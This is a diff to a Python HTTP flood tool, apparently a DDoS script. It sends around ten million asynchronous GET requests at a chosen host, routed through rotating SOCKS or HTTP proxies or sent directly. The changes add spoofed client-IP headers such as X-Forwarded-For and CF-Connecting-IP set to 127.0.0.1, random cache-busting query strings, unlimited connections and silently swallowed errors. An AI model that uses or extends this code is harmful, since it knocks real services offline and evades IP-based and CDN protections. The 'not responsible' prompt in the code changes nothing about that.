@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 from random import randint, choice, sample
 from urllib.parse import urlparse
-from aiohttp import ClientSession, TCPConnector, ClientConnectorError, ClientProxyConnectionError
-from asyncio import ensure_future, run, get_event_loop, Semaphore, wait
+from aiohttp import ClientSession, TCPConnector, ClientConnectorError, ClientProxyConnectionError, ClientOSError, ClientHttpProxyError, ServerConnectionError
+from asyncio import ensure_future, run, ProactorEventLoop, Semaphore, wait
 from aiosocks.connector import ProxyConnector, ProxyClientRequest
 from aiosocks import SocksError
 
@@ -95,8 +95,8 @@ class Functions:
 
     @staticmethod
     def Cache():
-        #rand param + nullbyte
-        return "?q={}{}".format(randint(666, 96969), "%00")
+        #rand param
+        return "?t={}".format(randint(666, 96969))
 
 
 class Form:
@@ -176,6 +176,15 @@ async def Yokai(session):
         'Cache-Control': 'public, max-age=0',
         'Content-Encoding': 'deflate',
         'Connection': 'keep-alive',
+        'X-Remote-IP': '127.0.0.1',
+        'X-Remote-Addr': '127.0.0.1',
+        'X-Forwarded-For': '127.0.0.1',
+        'X-Client-IP': '127.0.0.1',
+        'X-Originating-IP': '127.0.0.1',
+        'X-Real-Ip': '127.0.0.1',
+        'CF-Connecting-IP': '127.0.0.1',
+        'True-Client-IP': '127.0.0.1',
+        'Via': '1.1 Chrome-Compression-Proxy',
         'Host': Options.host
     }
     tasks = []
@@ -185,22 +194,17 @@ async def Yokai(session):
         try:
             kai = choice(Options.yokais)
             header.update({
-                "User-Agent": choice(Options.ua),
-                "X-Forwarded-For": kai,
+                "User-Agent": choice(Options.ua)
             })
             server = "{}://{}".format(Options.v_type, kai)
-            async with session.get(url=url + Functions.Cache(), allow_redirects=False, ssl=False, proxy=server, headers=header) as response:
+            async with session.get(url=url + Functions.Cache(), allow_redirects=True, ssl=True, proxy=server, headers=header) as response:
                 sem.release()
                 if i % 1000 == 0:
                     Functions.Success("Target: {} | Thread: {} | Status: {}".format(url, i, response.status))
-        except ClientProxyConnectionError:
-            Functions.Error("Proxy server connection reject.")
-        except ClientConnectorError:
-            Functions.Error("Fail to connect to target.")
-        except SocksError:
-            Functions.Error("Communication problem.")
+        except:
+            pass
 
-    for i in range(1, 10000000+1):
+    for i in range(1, 10000000):
         await sem.acquire()
         task = ensure_future(_call(i))
         task.add_done_callback(tasks.remove)
@@ -223,6 +227,10 @@ async def Direct(session):
         'X-Forwarded-For': '127.0.0.1',
         'X-Client-IP': '127.0.0.1',
         'X-Originating-IP': '127.0.0.1',
+        'X-Real-Ip': '127.0.0.1',
+        'CF-Connecting-IP': '127.0.0.1',
+        'True-Client-IP': '127.0.0.1',
+        'Via': '1.1 Chrome-Compression-Proxy',
         'Host': Options.host
     }
     tasks = []
@@ -237,10 +245,12 @@ async def Direct(session):
                 sem.release()
                 if i % 1000 == 0:
                     Functions.Success("Target: {} | Thread: {} | Status: {}".format(url, i, response.status))
-        except ClientConnectorError:
-            Functions.Error("Fail to connect to target.")
+        except ServerConnectionError as e:
+            Functions.Error(e.message)
+        except ClientConnectorError as e:
+            Functions.Error(e.message)
 
-    for i in range(1, 10000000+1):
+    for i in range(1, 10000000):
         await sem.acquire()
         task = ensure_future(_call(i))
         task.add_done_callback(tasks.remove)
@@ -252,7 +262,7 @@ async def Direct(session):
 
 async def Attack():
     if Functions.YokaiMode() == True:
-        async with ClientSession(connector=ProxyConnector(remote_resolve=True), request_class=ProxyClientRequest) as session:
+        async with ClientSession(connector=ProxyConnector(remote_resolve=True,limit=None), request_class=ProxyClientRequest) as session:
             await ensure_future(Yokai(session))
     else:
         async with ClientSession(connector=TCPConnector(limit=None)) as session:
@@ -264,7 +274,7 @@ def Console():
         print(Options.banner)
         input("\n\tI'm not responsible for any consequence of the use of this tool, press ENTER to continue.")
         Form.Validate()
-        loop = get_event_loop()
+        loop = ProactorEventLoop()
         loop.run_until_complete(Attack())
         loop.close()
     except (KeyboardInterrupt, EOFError):
